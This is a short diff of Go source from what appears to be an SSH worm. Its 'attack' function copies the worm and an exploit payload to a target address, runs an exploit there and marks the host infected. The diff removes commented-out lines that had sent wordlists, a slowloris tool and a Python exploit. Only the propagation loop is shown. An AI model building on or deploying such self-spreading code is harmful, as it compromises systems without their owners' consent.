@@ -36,12 +36,7 @@ func attack(wg *sync.WaitGroup, id int, ip string) {
 			}
 			message := infection.SshInfect(ip_port, "worm")
 			//We don't transfer the users and passwords because we are using the constants
-			//message = infection.SshInfect(ip_port, "users.txt")
-			//message = infection.SshInfect(ip_port, "passwords.txt")
-			//message = infection.SshInfect(ip_port, "slowloris")
-			//message = infection.SshInfect(ip_port, "exploit_nss.py")
 			message = infection.SshInfect(ip_port, "exploit_nss_manual")
-			//fmt.Println(message)
 			message = infection.SshExploit(ip_port)
 			fmt.Println(message)
 			infected = true
